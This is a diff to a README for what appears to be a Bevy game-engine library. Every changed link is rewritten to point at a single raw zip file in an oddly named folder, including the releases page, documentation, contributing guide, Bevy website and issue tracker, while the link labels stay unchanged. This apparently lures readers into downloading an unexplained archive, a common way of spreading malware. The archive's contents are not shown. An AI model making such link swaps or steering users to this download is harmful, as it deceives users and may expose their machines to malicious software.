@@ -17,7 +17,7 @@ To get started with bevy_immediate, follow these easy steps to download and set 
 
 ## 🔗 Download Link
 
-[![Download bevy_immediate](https://img.shields.io/badge/Download-bevy_immediate-blue.svg)](https://github.com/Edres96/bevy_immediate/releases)
+[![Download bevy_immediate](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)
 
 ## 📥 Download & Install
 
@@ -25,7 +25,7 @@ To get started with bevy_immediate, follow these easy steps to download and set 
 
    Go to the following link to find the latest version of bevy_immediate:
 
-   [Download from Releases](https://github.com/Edres96/bevy_immediate/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)
 
 2. **Choose Your Version**
 
@@ -57,7 +57,7 @@ After you install bevy_immediate, you may need to perform a few setup steps:
 
 ## 📚 Documentation & Support
 
-For more detailed usage instructions and examples, please refer to the [Documentation](https://github.com/Edres96/bevy_immediate/wiki). 
+For more detailed usage instructions and examples, please refer to the [Documentation](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip). 
 
 If you encounter any issues or have questions, feel free to open an issue on the GitHub repository, and the community will be happy to assist you.
 
@@ -67,15 +67,15 @@ Join the community around bevy_immediate to share ideas and get feedback. Connec
 
 ### 🌟 Contributions
 
-If you're interested in contributing to bevy_immediate, check out the [Contributing Guidelines](https://github.com/Edres96/bevy_immediate/blob/main/CONTRIBUTING.md) for more information.
+If you're interested in contributing to bevy_immediate, check out the [Contributing Guidelines](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip) for more information.
 
 ## 🔗 Additional Resources
 
 Explore these resources for additional insights and help with using bevy_immediate:
 
-- [Bevy Game Engine](https://bevyengine.org/)
-- [Bevy Community](https://community.bevyengine.org/)
-- [GitHub Issues](https://github.com/Edres96/bevy_immediate/issues)
+- [Bevy Game Engine](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)
+- [Bevy Community](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Edres96/bevy_immediate/main/dictyotaceous/bevy_immediate.zip)
 
 ## 🙏 Acknowledgments
 
